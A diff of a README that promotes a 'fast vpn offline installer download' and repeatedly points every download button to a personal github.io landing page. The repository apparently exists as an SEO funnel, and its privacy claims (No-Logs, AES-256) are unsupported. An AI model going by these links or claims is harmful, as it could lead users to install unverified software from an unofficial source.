@@ -1,87 +1,101 @@
 # ⚡ fast vpn offline installer download
 
-[![Download](https://img.shields.io/badge/Download-Offline%20Installer-blue?style=for-the-badge)](https://mandid22.github.io/fast-vpn-offline-installer-download-landing/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-111111?style=for-the-badge)](https://mandid22.github.io/fast-vpn-offline-installer-download-landing/)
-[![License](https://img.shields.io/badge/License-See%20Repo-5c2d91?style=for-the-badge)](https://github.com/mandid22/fast-vpn-offline-installer-download-seo)
+[![Download](https://img.shields.io/badge/Download-Offline%20Installer-blue?style=for-the-badge&logo=download)](https://mandid22.github.io/fast-vpn-offline-installer-download-landing/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-111?style=for-the-badge&logo=windowsterminal)](https://mandid22.github.io/fast-vpn-offline-installer-download-landing/)
+[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge&logo=github)](https://github.com/mandid22/fast-vpn-offline-installer-download-seo)
 
 ## About
 
-This repo documents **fast vpn offline installer download** for users who want a straightforward installer flow and a VPN that prioritizes **privacy and security** without babysitting the setup.
+**fast vpn offline installer download** is the quickest way to get *fast vpn* installed when you don’t want a web installer, broken mirrors, or flaky network steps. This repo documents the install flow, requirements, and what you can expect from the app once it’s on your machine.
 
-Project repo: https://github.com/mandid22/fast-vpn-offline-installer-download-seo  
-Landing page (all downloads): https://mandid22.github.io/fast-vpn-offline-installer-download-landing/
+Focus is simple: **high speed**, **stable connection**, and a **privacy and security focus** (AES-256 encryption, No-Logs policy, Kill Switch, Global Servers).
+
+Repo: https://github.com/mandid22/fast-vpn-offline-installer-download-seo  
+Get the installer: https://mandid22.github.io/fast-vpn-offline-installer-download-landing/
 
 ## Features
 
-- **High speed** with a **stable connection** for everyday browsing and streaming
 - **AES-256 encryption** for traffic protection
-- **No-Logs policy** to reduce data retention risk
-- **Kill Switch** to block traffic if the tunnel drops
-- **Global Servers** for location flexibility and better routing options
-- Clean install path with minimal steps across desktop platforms
+- **No-Logs policy** built into the product stance
+- **Kill Switch** to stop leaks when a connection drops
+- **Global Servers** for routing flexibility
+- **High speed** profiles tuned for streaming, work, and gaming
+- **Stable connection** behavior under typical network changes (Wi‑Fi hops, sleep/wake)
+- Simple UI: connect, switch region, verify status
 
 ## System Requirements
 
-| Item | Requirement |
+| Requirement | Minimum |
 |---|---|
 | Windows | Windows 10/11 (64-bit) |
 | macOS | macOS 11+ |
-| Linux | Ubuntu 20.04+/Debian-based (64-bit) |
-| RAM | 2 GB minimum (4 GB recommended) |
-| Storage | 200 MB free space |
-| Internet | Required for activation, sign-in, and server connections |
+| Linux | Ubuntu/Debian/Fedora (64-bit) |
+| RAM | 2 GB (4 GB recommended) |
+| Storage | 200 MB free |
+| Internet | Required for VPN connection (installer is offline) |
 
 ## Installation
 
-Use the landing page for the correct package and the latest installer notes:
-- https://mandid22.github.io/fast-vpn-offline-installer-download-landing/
+> Download the offline package from the landing page first:  
+> https://mandid22.github.io/fast-vpn-offline-installer-download-landing/
 
 ### Windows
-1. Download the Windows offline installer from the landing page.
-2. Run the installer (`.exe`) as a standard user (Admin only if your system prompts).
-3. Launch **fast vpn**, sign in, then pick a server and connect.
-4. (Recommended) Enable **Kill Switch** in settings.
+1. Download the Windows offline installer.
+2. Right-click → **Run as administrator**.
+3. Complete setup, launch **fast vpn**.
+4. Sign in (if prompted), choose a region, **Connect**.
+5. In Settings, enable **Kill Switch**.
 
 ### macOS
-1. Download the macOS installer from the landing page.
-2. Open the package and approve prompts in **System Settings** if requested.
-3. Launch **fast vpn**, sign in, connect to a nearby server first (best speed).
+1. Download the macOS offline installer.
+2. Open the `.dmg`, drag **fast vpn** into **Applications**.
+3. Open **fast vpn** from Applications.
+4. Approve network/VPN permission prompts.
+5. Enable **Kill Switch** in Settings.
 
 ### Linux
-1. Download the Linux package from the landing page.
-2. Install using your distro’s package method (from the downloaded file).
-3. Start the app, sign in, connect, then confirm **Kill Switch** is enabled in settings.
+1. Download the Linux package for your distro.
+2. Install with your package manager:
+   - Debian/Ubuntu: `sudo apt install ./fast-vpn*.deb`
+   - Fedora: `sudo dnf install ./fast-vpn*.rpm`
+3. Launch from your app menu or run `fast-vpn`.
+4. Connect and confirm the status indicator shows **Protected**.
 
 ## Comparison
 
-| Provider | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
+| Option | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
 |---|---:|---:|---:|---:|---:|
-| fast vpn | High speed | ✅ | ✅ | ✅ | ✅ |
-| Typical free VPN | Often slow | ❓ | ❌/unclear | ❌ | ❌/limited |
-| Basic proxy | Variable | ❌ | ❌ | ❌ | ❌ |
+| fast vpn (offline installer) | High | ✅ | ✅ | ✅ | ✅ |
+| Typical free VPN | Low–Medium | ❓ | ❓ | ❌ | ❌/Limited |
+| Browser “VPN” extensions | Low | ❌ | ❓ | ❌ | ❌ |
 
 ## FAQ
 
-**Does the offline installer work without internet?**  
-It installs offline. You still need internet to sign in and connect to VPN servers.
+**Q: What does “offline installer” mean here?**  
+A: The installer package downloads once, then installs without fetching extra setup components.
 
-**Is a Kill Switch included?**  
-Yes. Turn it on in settings to prevent leaks on disconnect.
+**Q: Do I still need internet after installation?**  
+A: Yes. Installation can be offline, but a VPN needs internet to connect to servers.
 
-**What encryption does it use?**  
-AES-256 encryption is supported.
+**Q: Does fast vpn include a Kill Switch?**  
+A: Yes—enable it in Settings so traffic stops if the VPN drops.
 
-**Is there a No-Logs policy?**  
-Yes. fast vpn follows a No-Logs policy.
+**Q: Where do I get the official fast vpn offline installer download?**  
+A: Use the landing page link below (same link used throughout this README).
 
 ## Download
 
-Get the **fast vpn offline installer download** here:  
-**https://mandid22.github.io/fast-vpn-offline-installer-download-landing/**
+**Official landing page (all platforms):**  
+https://mandid22.github.io/fast-vpn-offline-installer-download-landing/
+
+- Direct access to the **fast vpn offline installer download**
+- One page for Windows/macOS/Linux packages
+- Same destination as the buttons in this README
 
 ## Final CTA
 
-[![Get Offline Installer](https://img.shields.io/badge/Get%20Offline%20Installer-Open%20Landing%20Page-blue?style=for-the-badge)](https://mandid22.github.io/fast-vpn-offline-installer-download-landing/)
-[![Repo](https://img.shields.io/badge/View%20Repo-fast--vpn--offline--installer--download--seo-111111?style=for-the-badge)](https://github.com/mandid22/fast-vpn-offline-installer-download-seo)
+[![Get fast vpn offline installer download](https://img.shields.io/badge/Get-fast%20vpn%20offline%20installer%20download-blue?style=for-the-badge&logo=download)](https://mandid22.github.io/fast-vpn-offline-installer-download-landing/)
+[![Open landing page](https://img.shields.io/badge/Open-Landing%20Page-222?style=for-the-badge&logo=githubpages)](https://mandid22.github.io/fast-vpn-offline-installer-download-landing/)
+[![View repository](https://img.shields.io/badge/View-Repository-6e40c9?style=for-the-badge&logo=github)](https://github.com/mandid22/fast-vpn-offline-installer-download-seo)
 
-*Install fast vpn, connect fast, and keep your traffic locked down.*
+*If you want the clean path: grab the offline installer, install once, and keep your connection private.*
